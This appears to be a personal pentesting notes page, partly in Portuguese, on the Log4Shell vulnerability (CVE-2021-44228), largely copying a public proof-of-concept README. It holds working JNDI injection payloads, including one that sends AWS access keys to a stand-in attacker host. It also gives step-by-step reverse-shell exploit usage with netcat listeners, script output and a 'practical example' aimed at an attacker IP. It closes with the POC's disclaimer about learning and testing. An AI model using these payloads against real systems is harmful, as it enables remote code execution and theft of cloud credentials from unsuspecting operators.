Log4j
========================

Log4j
========================

source:

<https://www.tomitribe.com/blog/cve-2021-44228-log4shell-vulnerability/>

A simple way to test this is to use the “nc” program to start listening for connections in a terminal window:

     nc -l 4444

Enter the following text in your application’s input fields (amend the IP address as appropriate for your setup): 

    ${jndi:ldap://127.0.0.1:4444/}

If you see some weird characters show up in your nc window, then you have just successfully executed this vulnerability.


This is not just limited to fields that you might fill in within your application – anything that is sent to the application and subsequently logged is potentially vulnerable. HTTP request headers are often logged and are a place attackers will try and exploit this vulnerability. This is also not something that is restricted to servlet containers – anything that logs using log4j2 is potentially vulnerable.

Vazando credenciais AWS

    ${jndi:ldap://evil.attaker:1234/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY}}

poc para obter shell 

<https://github.com/kozmer/log4j-shell-poc/tree/main>


# log4j-shell-poc

[poc.py](https://github.com/kozmer/log4j-shell-poc/tree/main#log4j-shell-poc)

A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability.

Recently there was a new vulnerability in log4j, a java logging library that is very widely used in the likes of elasticsearch, minecraft and numerous others.

In this repository there is an example vulnerable application and proof-of-concept (POC) exploit of it.


## Proof-of-concept (POC)

#### Requirements:

```
pip install -r requirements.txt
```

#### Usage:

 Start a netcat listener to accept reverse shell connection.

```
nc -lvnp 9001
```
- Launch the exploit.
**Note:** For this to work, the extracted java archive has to be named: 
```
jdk1.8.0_20
```
, and be in the same directory.

```
$ python3 poc.py --userip localhost --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

Listening on 0.0.0.0:1389
```

**PRATICAL EXAMPLE**
```
python poc.py --userip <attacker_ip> --webport 8000 --lport 4444

#pratical example
cd ~/owncloud/Area_de_trabalho/tools/web/3_exploitation/log4j/log4j-shell-poc
python poc.py --userip <attacker_ip> --webport 8000 --lport 4444

nc -nlvp 4444
```

This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.


## Vulnerable application
[

](https://github.com/kozmer/log4j-shell-poc/tree/main#vulnerable-application)There is a Dockerfile with the vulnerable webapp. You can use this by following the steps below:


```
1: docker build -t log4j-shell-poc .
2: docker run --network host log4j-shell-poc
```


Once it is running, you can access it on localhost:8080


## Getting the Java version.
[

](https://github.com/kozmer/log4j-shell-poc/tree/main#getting-the-java-version)Oracle thankfully provides an archive for all previous java versions:
[https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html).
Scroll down to 
```
8u202
```
 and download the appropriate files for your operating system and hardware. [![media-WmCgLg](../../../media/media-WmCgLg.png)
](https://user-images.githubusercontent.com/46561460/145655967-b5808b9f-d919-476f-9cbc-ed9eaff51585.png)

**Note:** You do need to make an account to be able to download the package.

Once you have downloaded and extracted the archive, you can find 
```
java
```
 and a few related binaries in 
```
jdk1.8.0_20/bin
```
.
**Note:** Make sure to extract the jdk folder into this repository with the same name in order for it to work.


```

tar -xf jdk-8u202-linux-x64.tar.gz

./jdk1.8.0_202/bin/java -version
java version "1.8.0_202"
Java(TM) SE Runtime Environment (build 1.8.0_202-b26)
Java HotSpot(TM) 64-Bit Server VM (build 25.20-b23, mixed mode)

```

{%embed url="https://youtu.be/kg_RtREuUpM" %}

## Disclaimer
[](https://github.com/kozmer/log4j-shell-poc/tree/main#disclaimer)This repository is not intended to be a one-click exploit to CVE-2021-44228. The purpose of this project is to help people learn about this vulnerability, and perhaps test their own applications (however there are better applications for this purpose, ei: [https://log4shell.tools/](https://log4shell.tools/)).